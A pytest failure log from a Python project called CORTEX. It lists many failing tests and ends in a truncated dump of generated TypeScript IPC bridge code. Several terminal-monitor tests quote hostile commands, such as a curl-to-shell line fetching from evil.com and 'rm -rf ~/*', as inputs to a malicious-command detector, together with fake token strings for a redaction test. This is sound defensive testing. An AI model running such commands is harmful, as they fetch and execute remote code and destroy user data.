tests\workflows\test_workflow_integration.py:160: in test_feature_development_checkpoint_resume
    assert state.stage_statuses["test"] == StageStatus.FAILED
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   KeyError: 'test'
_ TestFeatureDevelopmentWorkflow.test_feature_development_required_stage_failure _
tests\workflows\test_workflow_integration.py:199: in test_feature_development_required_stage_failure
    assert state.stage_statuses["implement"] == StageStatus.FAILED
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
E   KeyError: 'implement'
___________ TestBugFixWorkflow.test_bug_fix_required_stage_failure ____________
tests\workflows\test_workflow_integration.py:279: in test_bug_fix_required_stage_failure
    assert state.stage_statuses[workflow.stages[0].id] == StageStatus.FAILED
E   AssertionError: assert <StageStatus.RUNNING: 'running'> == <StageStatus.FAILED: 'failed'>
E    +  where <StageStatus.FAILED: 'failed'> = StageStatus.FAILED
_______ TestRefactoringWorkflow.test_refactoring_required_stage_failure _______
tests\workflows\test_workflow_integration.py:352: in test_refactoring_required_stage_failure
    assert state.stage_statuses[workflow.stages[2].id] == StageStatus.FAILED
E   AssertionError: assert <StageStatus.RUNNING: 'running'> == <StageStatus.FAILED: 'failed'>
E    +  where <StageStatus.FAILED: 'failed'> = StageStatus.FAILED
____ TestSecurityEnhancementWorkflow.test_security_required_stage_failure _____
tests\workflows\test_workflow_integration.py:425: in test_security_required_stage_failure
    assert state.stage_statuses[workflow.stages[1].id] == StageStatus.FAILED
E   AssertionError: assert <StageStatus.RUNNING: 'running'> == <StageStatus.FAILED: 'failed'>
E    +  where <StageStatus.FAILED: 'failed'> = StageStatus.FAILED
============================ slowest 20 durations =============================
152.11s call     tests/edge_cases/test_input_validation.py::test_very_large_request_handling
14.99s call     tests/operations/test_workspace_cleanup.py::test_cleanup_standard_profile_removes_old_logs_and_cache
12.28s call     tests/tier0/test_fifo_enforcement.py::TestFIFOEnforcement::test_fifo_enforcement_60_conversations
9.31s call     tests/integration/test_cross_tier_workflows.py::TestCrossTierReadFlow::test_cross_tier_read_performance
9.27s call     tests/operations/test_workspace_cleanup.py::test_cleanup_vacuums_databases_when_present
5.60s call     tests/integration/test_error_recovery.py::TestFailureHandling::test_module_failure_doesnt_crash_operation
5.17s call     tests/performance/test_performance_regression.py::test_operation_environment_setup_performance
4.11s call     tests/integration/test_cross_tier_workflows.py::TestTierPerformanceUnderLoad::test_tier_performance_under_load
1.94s call     tests/tier0/test_brain_protector_conversation_tracking.py::TestConversationTrackingProtection::test_fifo_queue_enforcement
1.92s call     tests/edge_cases/test_session_lifecycle.py::test_session_overflow_protection
1.53s call     tests/ambient/test_file_watcher.py::TestFileSystemWatcher::test_detects_file_modification
1.53s call     tests/ambient/test_file_watcher.py::TestFileSystemWatcher::test_ignores_git_directory
1.53s call     tests/ambient/test_file_watcher.py::TestFileSystemWatcher::test_relative_paths_in_events
1.52s call     tests/ambient/test_file_watcher.py::TestFileSystemWatcher::test_detects_file_creation
1.52s call     tests/ambient/test_file_watcher.py::TestFileSystemWatcher::test_event_contains_timestamp
1.51s call     tests/ambient/test_file_watcher.py::TestFileSystemWatcher::test_ignores_pycache_files
1.15s call     tests/tier2/test_amnesia.py::TestSafetyProtections::test_safety_threshold_prevents_mass_deletion
1.03s call     tests/ambient/test_integration.py::TestEndToEndCapture::test_error_recovery_on_tier1_failure
1.00s call     tests/tier1/test_vision_api.py::TestMetrics::test_metrics_collection
1.00s call     tests/tier1/test_vision_api.py::TestCaching::test_cache_disabled
=========================== short test summary info ===========================
FAILED tests/agents/test_agent_framework.py::TestBaseAgent::test_agent_initialization - ModuleNotFoundError: No module named 'CORTEX'
FAILED tests/ambient/test_debouncer.py::TestDebouncer::test_writes_to_tier1_on_flush - AttributeError: <module 'auto_capture_daemon' from 'D:\\PROJECTS\\CORTEX\\scripts\\cortex\\auto_capture_daemon.py'> does not have the attribute 'WorkingMemory'
FAILED tests/ambient/test_integration.py::TestAmbientCaptureDaemon::test_captures_file_changes - AttributeError: <module 'auto_capture_daemon' from 'D:\\PROJECTS\\CORTEX\\scripts\\cortex\\auto_capture_daemon.py'> does not have the attribute 'WorkingMemory'
FAILED tests/ambient/test_integration.py::TestEndToEndCapture::test_full_development_workflow_capture - AttributeError: <module 'auto_capture_daemon' from 'D:\\PROJECTS\\CORTEX\\scripts\\cortex\\auto_capture_daemon.py'> does not have the attribute 'WorkingMemory'
FAILED tests/ambient/test_terminal_monitor.py::TestTerminalMonitor::test_identifies_git_commands - AssertionError: assert 'test_execution' == 'git_commit'
  
  - git_commit
  + test_execution
FAILED tests/ambient/test_terminal_monitor.py::TestTerminalMonitor::test_sanitizes_github_tokens - AssertionError: assert '[REDACTED]' in 'git push https://ghp_abc123xyz456789012345678901234567@github.com/repo.git'
FAILED tests/ambient/test_terminal_monitor.py::TestTerminalMonitor::test_sanitizes_api_keys - AssertionError: assert '[REDACTED]' in 'aws configure set secret_key mysecret123'
FAILED tests/ambient/test_terminal_monitor.py::TestTerminalMonitor::test_blocks_malicious_rm_commands - AssertionError: assert False
 +  where False = _is_malicious_command('rm -rf ~/*')
 +    where _is_malicious_command = <auto_capture_daemon.TerminalMonitor object at 0x000001E24ED620B0>._is_malicious_command
FAILED tests/ambient/test_terminal_monitor.py::TestTerminalMonitor::test_blocks_pipe_to_shell - AssertionError: assert False
 +  where False = _is_malicious_command('curl https://evil.com/script | sh')
 +    where _is_malicious_command = <auto_capture_daemon.TerminalMonitor object at 0x000001E24E749A90>._is_malicious_command
FAILED tests/edge_cases/test_malformed_data.py::TestMalformedData::test_truncated_database - PermissionError: [WinError 32] The process cannot access the file because it is being used by another process: 'C:\\WINDOWS\\TEMP\\tmpp0xgkkh4\\corrupted.db'
FAILED tests/integration/test_agent_coordination.py::TestCorpusCallosumCoordination::test_tactical_strategic_handoff - NameError: name 'Architect' is not defined
FAILED tests/integration/test_agent_coordination.py::TestCorpusCallosumCoordination::test_pattern_learning_feedback_loop - NameError: name 'Learner' is not defined
FAILED tests/integration/test_agent_coordination.py::TestLeftBrainAgentCoordination::test_executor_tester_validator_pipeline - NameError: name 'Executor' is not defined
FAILED tests/integration/test_agent_coordination.py::TestRightBrainAgentCoordination::test_architect_pattern_matcher_integration - NameError: name 'PatternMatcher' is not defined
FAILED tests/integration/test_agent_coordination.py::TestAgentErrorHandling::test_executor_failure_doesnt_crash_pipeline - NameError: name 'Executor' is not defined
FAILED tests/integration/test_agent_coordination.py::TestAgentErrorHandling::test_invalid_intent_handled_gracefully - TypeError: IntentRouter.__init__() got an unexpected keyword argument 'brain_root'
FAILED tests/integration/test_agent_coordination.py::TestAgentMemorySharing::test_agents_access_shared_knowledge_graph - NameError: name 'Learner' is not defined
FAILED tests/integration/test_agent_coordination.py::TestAgentMemorySharing::test_agents_access_shared_conversation_history - TypeError: IntentRouter.__init__() got an unexpected keyword argument 'brain_root'
FAILED tests/integration/test_agent_coordination.py::TestConcurrentAgentExecution::test_parallel_independent_operations - TypeError: IntentRouter.__init__() got an unexpected keyword argument 'brain_root'
FAILED tests/integration/test_error_recovery.py::TestFailureHandling::test_operation_failure_returns_error_report - AttributeError: <class 'src.operations.operation_factory.OperationFactory'> does not have the attribute 'get_operation_definition'
FAILED tests/integration/test_error_recovery.py::TestErrorRecoveryStrategies::test_retry_with_exponential_backoff - Exception: Transient failure
FAILED tests/integration/test_error_recovery.py::TestErrorRecoveryStrategies::test_graceful_degradation - AttributeError: <class 'src.tier1.vision_api.VisionAPI'> does not have the attribute 'analyze_screenshot'
FAILED tests/integration/test_error_recovery.py::TestOperationChainFailures::test_required_module_failure_stops_chain - AttributeError: <class 'src.operations.operations_orchestrator.OperationsOrchestrator'> does not have the attribute 'execute'
FAILED tests/integration/test_error_recovery.py::TestOperationChainFailures::test_optional_module_failure_continues_chain - AttributeError: <class 'src.operations.operations_orchestrator.OperationsOrchestrator'> does not have the attribute 'execute'
FAILED tests/integration/test_phase_5_1_medium_priority.py::test_refactor_code_quality_workflow - assert ('refactor' in "\u2713 **success**\n\nanalyzed authentication module structure\n\n**current_structure: {'issues': ['tight coupling', 'missing abstraction**\n\n_say 'show details' for more info_" or 'architect' in "\u2713 **success**\n\nanalyzed authentication module structure\n\n**current_structure: {'issues': ['tight coupling', 'missing abstraction**\n\n_say 'show details' for more info_")
 +  where "\u2713 **success**\n\nanalyzed authentication module structure\n\n**current_structure: {'issues': ['tight coupling', 'missing abstraction**\n\n_say 'show details' for more info_" = <built-in method lower of str object at 0x000001E24E84FD20>()
 +    where <built-in method lower of str object at 0x000001E24E84FD20> = "\u2713 **SUCCESS**\n\nAnalyzed authentication module structure\n\n**current_structure: {'issues': ['Tight coupling', 'Missing abstraction**\n\n_Say 'show details' for more info_".lower
 +  and   "\u2713 **success**\n\nanalyzed authentication module structure\n\n**current_structure: {'issues': ['tight coupling', 'missing abstraction**\n\n_say 'show details' for more info_" = <built-in method lower of str object at 0x000001E24E84FD20>()
 +    where <built-in method lower of str object at 0x000001E24E84FD20> = "\u2713 **SUCCESS**\n\nAnalyzed authentication module structure\n\n**current_structure: {'issues': ['Tight coupling', 'Missing abstraction**\n\n_Say 'show details' for more info_".lower
FAILED tests/operations/test_cleanup_orchestrator.py::TestCleanupOrchestrator::test_initialization - TypeError: 'OperationModuleMetadata' object is not subscriptable
FAILED tests/operations/test_cleanup_orchestrator.py::TestCleanupOrchestrator::test_metadata - TypeError: argument of type 'OperationModuleMetadata' is not iterable
FAILED tests/operations/test_cleanup_orchestrator.py::TestFileReorganization::test_script_reorganization - assert 0 >= 1
 +  where 0 = CleanupMetrics(timestamp=datetime.datetime(2025, 11, 11, 12, 42, 19, 390659), backups_deleted=0, backups_archived=0, files_reorganized=0, md_files_consolidated=0, root_files_cleaned=0, bloated_files_found=0, space_freed_bytes=0, git_commits_created=0, duration_seconds=0.0, optimization_triggered=False, warnings=[], errors=[]).files_reorganized
 +    where CleanupMetrics(timestamp=datetime.datetime(2025, 11, 11, 12, 42, 19, 390659), backups_deleted=0, backups_archived=0, files_reorganized=0, md_files_consolidated=0, root_files_cleaned=0, bloated_files_found=0, space_freed_bytes=0, git_commits_created=0, duration_seconds=0.0, optimization_triggered=False, warnings=[], errors=[]) = <CleanupOrchestrator id=cleanup_orchestrator phase=processing priority=100>.metrics
FAILED tests/operations/test_cleanup_orchestrator.py::TestMDConsolidation::test_duplicate_detection - assert 0 >= 3
 +  where 0 = CleanupMetrics(timestamp=datetime.datetime(2025, 11, 11, 12, 42, 19, 469510), backups_deleted=0, backups_archived=0, files_reorganized=0, md_files_consolidated=0, root_files_cleaned=0, bloated_files_found=0, space_freed_bytes=0, git_commits_created=0, duration_seconds=0.0, optimization_triggered=False, warnings=[], errors=[]).md_files_consolidated
 +    where CleanupMetrics(timestamp=datetime.datetime(2025, 11, 11, 12, 42, 19, 469510), backups_deleted=0, backups_archived=0, files_reorganized=0, md_files_consolidated=0, root_files_cleaned=0, bloated_files_found=0, space_freed_bytes=0, git_commits_created=0, duration_seconds=0.0, optimization_triggered=False, warnings=[], errors=[]) = <CleanupOrchestrator id=cleanup_orchestrator phase=processing priority=100>.metrics
FAILED tests/operations/test_cleanup_orchestrator.py::TestMDConsolidation::test_newest_file_kept - assert 0 >= 1
 +  where 0 = CleanupMetrics(timestamp=datetime.datetime(2025, 11, 11, 12, 42, 19, 515132), backups_deleted=0, backups_archived=0, files_reorganized=0, md_files_consolidated=0, root_files_cleaned=0, bloated_files_found=0, space_freed_bytes=0, git_commits_created=0, duration_seconds=0.0, optimization_triggered=False, warnings=[], errors=[]).md_files_consolidated
 +    where CleanupMetrics(timestamp=datetime.datetime(2025, 11, 11, 12, 42, 19, 515132), backups_deleted=0, backups_archived=0, files_reorganized=0, md_files_consolidated=0, root_files_cleaned=0, bloated_files_found=0, space_freed_bytes=0, git_commits_created=0, duration_seconds=0.0, optimization_triggered=False, warnings=[], errors=[]) = <CleanupOrchestrator id=cleanup_orchestrator phase=processing priority=100>.metrics
FAILED tests/operations/test_cleanup_orchestrator.py::TestBloatDetection::test_entry_point_bloat_detection - assert 0 >= 1
 +  where 0 = CleanupMetrics(timestamp=datetime.datetime(2025, 11, 11, 12, 42, 19, 647592), backups_deleted=0, backups_archived=0, files_reorganized=0, md_files_consolidated=0, root_files_cleaned=0, bloated_files_found=0, space_freed_bytes=0, git_commits_created=0, duration_seconds=0.0, optimization_triggered=False, warnings=[], errors=[]).bloated_files_found
 +    where CleanupMetrics(timestamp=datetime.datetime(2025, 11, 11, 12, 42, 19, 647592), backups_deleted=0, backups_archived=0, files_reorganized=0, md_files_consolidated=0, root_files_cleaned=0, bloated_files_found=0, space_freed_bytes=0, git_commits_created=0, duration_seconds=0.0, optimization_triggered=False, warnings=[], errors=[]) = <CleanupOrchestrator id=cleanup_orchestrator phase=processing priority=100>.metrics
FAILED tests/operations/test_cleanup_orchestrator.py::TestBloatDetection::test_orchestrator_bloat_detection - assert 0 >= 1
 +  where 0 = CleanupMetrics(timestamp=datetime.datetime(2025, 11, 11, 12, 42, 19, 702193), backups_deleted=0, backups_archived=0, files_reorganized=0, md_files_consolidated=0, root_files_cleaned=0, bloated_files_found=0, space_freed_bytes=0, git_commits_created=0, duration_seconds=0.0, optimization_triggered=False, warnings=[], errors=[]).bloated_files_found
 +    where CleanupMetrics(timestamp=datetime.datetime(2025, 11, 11, 12, 42, 19, 702193), backups_deleted=0, backups_archived=0, files_reorganized=0, md_files_consolidated=0, root_files_cleaned=0, bloated_files_found=0, space_freed_bytes=0, git_commits_created=0, duration_seconds=0.0, optimization_triggered=False, warnings=[], errors=[]) = <CleanupOrchestrator id=cleanup_orchestrator phase=processing priority=100>.metrics
FAILED tests/operations/test_cleanup_orchestrator.py::TestOptimizationIntegration::test_optimization_trigger - AttributeError: <module 'src.operations.modules.cleanup.cleanup_orchestrator' from 'D:\\PROJECTS\\CORTEX\\src\\operations\\modules\\cleanup\\cleanup_orchestrator.py'> does not have the attribute 'OptimizeCortexOrchestrator'
FAILED tests/operations/test_cleanup_orchestrator.py::TestOptimizationIntegration::test_optimization_failure_handling - AttributeError: <module 'src.operations.modules.cleanup.cleanup_orchestrator' from 'D:\\PROJECTS\\CORTEX\\src\\operations\\modules\\cleanup\\cleanup_orchestrator.py'> does not have the attribute 'OptimizeCortexOrchestrator'
FAILED tests/operations/test_cleanup_orchestrator.py::TestErrorHandling::test_git_operation_failure - Exception: Git error
FAILED tests/operations/test_execution_mode.py::TestDryRunMixin::test_print_copyright_header - UnicodeDecodeError: 'charmap' codec can't decode byte 0x81 in position 1223: character maps to <undefined>
FAILED tests/operations/test_execution_mode.py::TestDryRunMixin::test_print_copyright_header_dry_run - UnicodeDecodeError: 'charmap' codec can't decode byte 0x81 in position 1223: character maps to <undefined>
FAILED tests/operations/test_story_refresh_integration.py::TestStoryRefreshIntegration::test_story_refresh_changes_output_file - AssertionError: SKULL-005 VIOLATION: Story refresh claims success but file unchanged!
  Before: 9d2e3b70f321b5f49faa7dd8d52901a9
  After:  9d2e3b70f321b5f49faa7dd8d52901a9
  Operation: refresh_cortex_story
  Status: True
  This indicates a pass-through or no-op implementation.
assert '9d2e3b70f321b5f49faa7dd8d52901a9' != '9d2e3b70f321b5f49faa7dd8d52901a9'
FAILED tests/operations/test_story_refresh_integration.py::TestStoryRefreshIntegration::test_story_refresh_produces_git_diff - AssertionError: SKULL-005 VIOLATION: Story refresh claims success but git diff empty!
  Operation: refresh_cortex_story
  Output file: D:\PROJECTS\CORTEX\docs\awakening-of-cortex.md
  Status: True
  Run 'git diff D:\PROJECTS\CORTEX\docs\awakening-of-cortex.md' to verify.
  This indicates the operation did nothing despite claiming success.
assert False
FAILED tests/operations/test_story_refresh_integration.py::TestStoryRefreshIntegration::test_apply_narrator_voice_not_passthrough - UnicodeDecodeError: 'charmap' codec can't decode byte 0x8f in position 3585: character maps to <undefined>
FAILED tests/operations/test_story_refresh_integration.py::TestStoryRefreshIntegration::test_operation_success_matches_actual_changes - AssertionError: SKULL-005 VIOLATION: Operation reports success=True but no changes!
  Operation: refresh_cortex_story
  Modules executed: 5
  Modules succeeded: 5
  File hash unchanged: 9d2e3b70f321b5f49faa7dd8d52901a9
  
  This is a FALSE SUCCESS - operation did nothing.
  Fix by implementing real transformation or returning success=False.
assert False
FAILED tests/operations/test_story_refresh_integration.py::TestStoryRefreshIntegration::test_story_output_has_expected_sections - UnicodeDecodeError: 'charmap' codec can't decode byte 0x8f in position 1856: character maps to <undefined>
FAILED tests/operations/test_story_refresh_integration.py::TestStoryRefreshIntegration::test_operation_handles_missing_source - Failed: DID NOT RAISE <class 'Exception'>
FAILED tests/operations/test_story_refresh_integration.py::TestMockDetectionForAllOperations::test_no_mocks_in_demo_modules - UnicodeDecodeError: 'charmap' codec can't decode byte 0x8f in position 5325: character maps to <undefined>
FAILED tests/operations/test_workspace_cleanup.py::test_cleanup_safe_profile_scans_and_reports - assert False is True
 +  where False = OperationExecutionReport(operation_id='workspace_cleanup', operation_name='Workspace Cleanup', success=False, modules_executed=['cleanup_orchestrator'], modules_succeeded=[], modules_failed=['cleanup_orchestrator'], modules_skipped=[], module_results={'cleanup_orchestrator': OperationResult(success=False, status=<OperationStatus.FAILED: 'failed'>, message="Cleanup failed: [WinError 32] The process cannot access the file because it is being used by another process: 'D:\\\\PROJECTS\\\\CORTEX\\\\test_timing.log'", data={'error': "[WinError 32] The process cannot access the file because it is being used by another process: 'D:\\\\PROJECTS\\\\CORTEX\\\\test_timing.log'"}, errors=[], warnings=[], duration_seconds=0.0, timestamp=datetime.datetime(2025, 11, 11, 12, 42, 25, 654346), execution_mode=<ExecutionMode.LIVE: 'live'>, formatted_header=None, formatted_footer=None)}, total_duration_seconds=0.012135, timestamp=datetime.datetime(2025, 11, 11, 12, 42, 25, 654551), context={'project_root': WindowsPath('C:/Windows/Temp/pytest-of-asifh/pytest-104/test_cleanup_safe_profile_scan0/cortex_sandbox'), 'profile': 'safe', 'execution_mode': <ExecutionMode.LIVE: 'live'>}, errors=[]).success
FAILED tests/operations/test_workspace_cleanup.py::test_cleanup_standard_profile_removes_old_logs_and_cache - assert False is True
 +  where False = OperationExecutionReport(operation_id='workspace_cleanup', operation_name='Workspace Cleanup', success=False, modules_executed=['cleanup_orchestrator'], modules_succeeded=[], modules_failed=['cleanup_orchestrator'], modules_skipped=[], module_results={'cleanup_orchestrator': OperationResult(success=False, status=<OperationStatus.FAILED: 'failed'>, message="Cleanup failed: [WinError 32] The process cannot access the file because it is being used by another process: 'D:\\\\PROJECTS\\\\CORTEX\\\\test_timing.log'", data={'error': "[WinError 32] The process cannot access the file because it is being used by another process: 'D:\\\\PROJECTS\\\\CORTEX\\\\test_timing.log'"}, errors=[], warnings=[], duration_seconds=0.0, timestamp=datetime.datetime(2025, 11, 11, 12, 42, 40, 689383), execution_mode=<ExecutionMode.LIVE: 'live'>, formatted_header=None, formatted_footer=None)}, total_duration_seconds=14.990345, timestamp=datetime.datetime(2025, 11, 11, 12, 42, 40, 689595), context={'project_root': WindowsPath('C:/Windows/Temp/pytest-of-asifh/pytest-104/test_cleanup_standard_profile_0/cortex_sandbox'), 'profile': 'standard', 'execution_mode': <ExecutionMode.LIVE: 'live'>}, errors=[]).success
FAILED tests/operations/test_workspace_cleanup.py::test_cleanup_vacuums_databases_when_present - assert False is True
 +  where False = OperationExecutionReport(operation_id='workspace_cleanup', operation_name='Workspace Cleanup', success=False, modules_executed=['cleanup_orchestrator'], modules_succeeded=[], modules_failed=['cleanup_orchestrator'], modules_skipped=[], module_results={'cleanup_orchestrator': OperationResult(success=False, status=<OperationStatus.FAILED: 'failed'>, message="Cleanup failed: [WinError 32] The process cannot access the file because it is being used by another process: 'D:\\\\PROJECTS\\\\CORTEX\\\\test_timing.log'", data={'error': "[WinError 32] The process cannot access the file because it is being used by another process: 'D:\\\\PROJECTS\\\\CORTEX\\\\test_timing.log'"}, errors=[], warnings=[], duration_seconds=0.0, timestamp=datetime.datetime(2025, 11, 11, 12, 42, 49, 989600), execution_mode=<ExecutionMode.LIVE: 'live'>, formatted_header=None, formatted_footer=None)}, total_duration_seconds=9.264361, timestamp=datetime.datetime(2025, 11, 11, 12, 42, 49, 989983), context={'project_root': WindowsPath('C:/Windows/Temp/pytest-of-asifh/pytest-104/test_cleanup_vacuums_databases0/cortex_sandbox'), 'profile': 'standard', 'execution_mode': <ExecutionMode.LIVE: 'live'>}, errors=[]).success
FAILED tests/plugins/test_cleanup_plugin.py::TestGitHubArchival::test_archive_backups_to_github - assert 0 > 0
 +  where 0 = CleanupStats(files_scanned=0, files_deleted=2, files_archived=0, files_compressed=0, files_moved=0, directories_removed=10, duplicates_found=0, space_freed_bytes=32, warnings=['Missing required directory: prompts', 'Missing required directory: workflows'], errors=["Failed to delete backup C:\\WINDOWS\\TEMP\\tmpwhw7pvn0\\file1.bak: 'commit_sha'", "Failed to delete backup C:\\WINDOWS\\TEMP\\tmpwhw7pvn0\\subdir\\file2.old: 'commit_sha'"]).files_scanned
 +    where CleanupStats(files_scanned=0, files_deleted=2, files_archived=0, files_compressed=0, files_moved=0, directories_removed=10, duplicates_found=0, space_freed_bytes=32, warnings=['Missing required directory: prompts', 'Missing required directory: workflows'], errors=["Failed to delete backup C:\\WINDOWS\\TEMP\\tmpwhw7pvn0\\file1.bak: 'commit_sha'", "Failed to delete backup C:\\WINDOWS\\TEMP\\tmpwhw7pvn0\\subdir\\file2.old: 'commit_sha'"]) = <src.plugins.cleanup_plugin.Plugin object at 0x000001E24E8D7490>.stats
FAILED tests/plugins/test_code_review_plugin.py::TestSecurityScanner::test_detect_hardcoded_api_key - assert 0 == 1
 +  where 0 = len([])
FAILED tests/plugins/test_code_review_plugin.py::TestSecurityScanner::test_detect_sql_injection_concatenation - assert 0 == 1
 +  where 0 = len([])
FAILED tests/plugins/test_command_registry.py::TestPlatformSwitchCommands::test_platform_commands_registered - assert 0 > 0
 +  where 0 = len([])
FAILED tests/plugins/test_doc_refresh_file_rules.py::TestDocRefreshFileCreationProhibition::test_fails_when_file_does_not_exist - assert 'CRITICAL VIOLATION' in "Architecture evaluation failed: Architecture evaluation failed: 'list' object has no attribute 'get'"
FAILED tests/plugins/test_doc_refresh_file_rules.py::TestDocRefreshFileCreationProhibition::test_prohibits_quick_read_creation - assert 'NEVER creates new files' in "Architecture evaluation failed: Architecture evaluation failed: 'list' object has no attribute 'get'"
FAILED tests/plugins/test_doc_refresh_file_rules.py::TestDocRefreshFileCreationProhibition::test_prohibits_summary_variant_creation - assert 'NEVER creates new files' in "Architecture evaluation failed: Architecture evaluation failed: 'list' object has no attribute 'get'"
FAILED tests/plugins/test_doc_refresh_plugin.py::TestStoryRefreshCapabilities::test_story_refresh_full_regeneration - assert False is True
FAILED tests/plugins/test_doc_refresh_plugin.py::TestStoryRefreshCapabilities::test_story_refresh_file_not_exists_error - assert 'PROHIBITED' in "Architecture evaluation failed: Architecture evaluation failed: 'list' object has no attribute 'get'"
FAILED tests/plugins/test_doc_refresh_plugin.py::TestStoryRefreshCapabilities::test_lab_notebook_condensation - assert -605.6 > 50
FAILED tests/plugins/test_doc_refresh_plugin.py::TestBackupAndSafety::test_no_file_creation_enforcement - assert 'PROHIBITED' in "Architecture evaluation failed: Architecture evaluation failed: 'list' object has no attribute 'get'"
FAILED tests/plugins/test_extension_scaffold_plugin.py::TestExtensionGeneration::test_execute_extension_scaffold_success - assert False is True
FAILED tests/plugins/test_extension_scaffold_plugin.py::TestExtensionGeneration::test_execute_with_custom_features - assert False is True
FAILED tests/plugins/test_extension_scaffold_plugin.py::TestDirectoryStructureGeneration::test_directory_structure_creation - assert False
 +  where False = any(<generator object TestDirectoryStructureGeneration.test_directory_structure_creation.<locals>.<genexpr> at 0x000001E24EA6DB60>)
FAILED tests/plugins/test_extension_scaffold_plugin.py::TestTypeScriptGeneration::test_brain_bridge_ts_generation - assert 'IPC' in "// brain bridge - typescript \u2194 python ipc communication\nimport * as vscode from 'vscode';\nimport * as child_process from 'child_process';\nimport * as ipc from 'node-ipc';\n\nexport class brainbridge {\n    private pythonprocess: child_process.childprocess | null = null;\n    private ipcclient: any = null;\n    \n    constructor(private context: vscode.extensioncontext) {}\n    \n    async initialize(): promise<void> {\n        console.log('initializing cortex brain bridge...');\n        \n        // get python path from configuration\n        const config = vscode.workspace.getconfiguration('cortex');\n        const pythonpath = config.get<string>('pythonpath', 'python');\n        \n        // get cortex brain path\n        const brainpath = config.get<string>('brainpath', '') || this._detectbrainpath();\n        \n        if (!brainpath) {\n            throw new error('cortex brain path not found. please configure cortex.brainpath');\n        }\n        \n        // start python ipc server\n        const bridgescript = `${brainpath}/src/plugins/extension_bridge.py`;\n        this.pythonprocess = child_process.spawn(pythonpath, [bridgescript]);\n        \n        // setup ipc client\n        ipc.config.id = 'cortex_extension';\n        ipc.config.retry = 1500;\n        ipc.config.silent = true;\n        \n        return new promise((resolve, reject) => {\n            ipc.connectto('cortex_brain', () => {\n                ipc.of.cortex_brain.on('connect', () => {\n                    console.log('connected to cortex brain');\n                    this.ipcclient = ipc.of.cortex_brain;\n                    resolve();\n                });\n                \n                ipc.of.cortex_brain.on('error', (err: error) => {\n                    console.error('brain bridge error:', err);\n                    reject(err);\n                });\n            });\n        });\n    }\n    \n    async capturemessage(message: any): promise<void> {\n        return this._sendcommand('capture_message', message);\n    }\n    \n    async captureresponse(response: any): promise<void> {\n        return this._sendcommand('capture_response', response);\n    }\n    \n    async routerequest(prompt: string, context: any): promise<any> {\n        return this._sendcommand('route_request', { prompt, context });\n    }\n    \n    async getlastactiveconversation(): promise<any> {\n        return this._sendcommand('get_last_active_conversation', {});\n    }\n    \n    async getconversationhistory(): promise<any[]> {\n        return this._sendcommand('get_conversation_history', {});\n    }\n    \n    async resumeconversation(conversationid: string): promise<void> {\n        return this._sendcommand('resume_conversation', { conversationid });\n    }\n    \n    async clearhistory(): promise<void> {\n        return this._sendcommand('clear_history', {});\n    }\n    \n    async gettokenmetrics(): promise<any> {\n        return this._sendcommand('get_token_metrics', {});\n    }\n    \n    dispose(): void {\n        if (this.ipcclient) {\n            ipc.disconnect('cortex_brain');\n        }\n        if (this.pythonprocess) {\n            this.pythonprocess.kill();\n        }\n    }\n    \n    private _sendcommand(command: string, params: any): promise<any> {\n        return new promise((resolve, reject) => {\n            if (!this.ipcclient) {\n                reject(new error('brain bridge not initialized'));\n                return;\n            }\n            \n            const requestid = math.random().tostring(36).substring(7);\n            \n            this.ipcclient.emit('command', {\n                id: requestid,\n                command,\n                params\n            });\n            \n            const timeout = settimeout(() => {\n                reject(new error('command timeout'));\n            }, 30000);\n            \n            this.ipcclient.on(`response_${requestid}`, (response: any) => {\n                cleartimeout(timeout);\n                if (response.error) {\n                    reject(new error(response.error));\n                } else {\n                    resolve(response.result);\n                }\n            });\n        });\n    }\n    \n    private _detectbrainpath(): string {\n        // try to detect cortex brain path\n        const workspacefolders = vscode.workspace.workspacefolders;\n        if (workspacefolders && workspacefolders.length > 0) {\n            const rootpath = workspacefolders[0].uri.fspath;\n            // check if cortex-brain folder exists\n            if (require('fs').existssync(`${rootpath}/cortex-brain`)) {\n                return rootpath;\n            }\n        }\n        return '';\n    }\n}\n"
 +  where "// brain bridge - typescript \u2194 python ipc communication\nimport * as vscode from 'vscode';\nimport * as child_process from 'child_process';\nimport * as ipc from 'node-ipc';\n\nexport class brainbridge {\n    private pythonprocess: child_process.childprocess | null = null;\n    private ipcclient: any = null;\n    \n    constructor(private context: vscode.extensioncontext) {}\n    \n    async initialize(): promise<void> {\n        console.log('initializing cortex brain bridge...');\n        \n        // get python path from configuration\n        const config = vscode.workspace.getconfiguration('cortex');\n        const pythonpath = config.get<string>('pythonpath', 'python');\n        \n        // get cortex brain path\n        const brainpath = config.get<string>('brainpath', '') || this._detectbrainpath();\n        \n        if (!brainpath) {\n            throw new error('cortex brain path not found. please configure cortex.brainpath');\n        }\n        \n        // start python ipc server\n        const bridgescript = `${brainpath}/src/plugins/extension_bridge.py`;\n        this.pythonprocess = child_process.spawn(pythonpath, [bridgescript]);\n        \n        // setup ipc client\n        ipc.config.id = 'cortex_extension';\n        ipc.config.retry = 1500;\n        ipc.config.silent = true;\n        \n        return new promise((resolve, reject) => {\n            ipc.connectto('cortex_brain', () => {\n                ipc.of.cortex_brain.on('connect', () => {\n                    console.log('connected to cortex brain');\n                    this.ipcclient = ipc.of.cortex_brain;\n                    resolve();\n                });\n                \n                ipc.of.cortex_brain.on('error', (err: error) => {\n                    console.error('brain bridge error:', err);\n                    reject(err);\n                });\n            });\n        });\n    }\n    \n    async capturemessage(message: any): promise<void> {\n        return this._sendcommand('capture_message', message);\n    }\n    \n    async captureresponse(response: any): promise<void> {\n        return this._sendcommand('capture_response', response);\n    }\n    \n    async routerequest(prompt: string, context: any): promise<any> {\n        return this._sendcommand('route_request', { prompt, context });\n    }\n    \n    async getlastactiveconversation(): promise<any> {\n        return this._sendcommand('get_last_active_conversation', {});\n    }\n    \n    async getconversationhistory(): promise<any[]> {\n        return this._sendcommand('get_conversation_history', {});\n    }\n    \n    async resumeconversation(conversationid: string): promise<void> {\n        return this._sendcommand('resume_conversation', { conversationid });\n    }\n    \n    async clearhistory(): promise<void> {\n        return this._sendcommand('clear_history', {});\n    }\n    \n    async gettokenmetrics(): promise<any> {\n        return this._sendcommand('get_token_metrics', {});\n    }\n    \n    dispose(): void {\n        if (this.ipcclient) {\n            ipc.disconnect('cortex_brain');\n        }\n        if (this.pythonprocess) {\n            this.pythonprocess.kill();\n        }\n    }\n    \n    private _sendcommand(command: string, params: any): promise<any> {\n        return new promise((resolve, reject) => {\n            if (!this.ipcclient) {\n                reject(new error('brain bridge not initialized'));\n                return;\n            }\n            \n            const requestid = math.random().tostring(36).substring(7);\n            \n            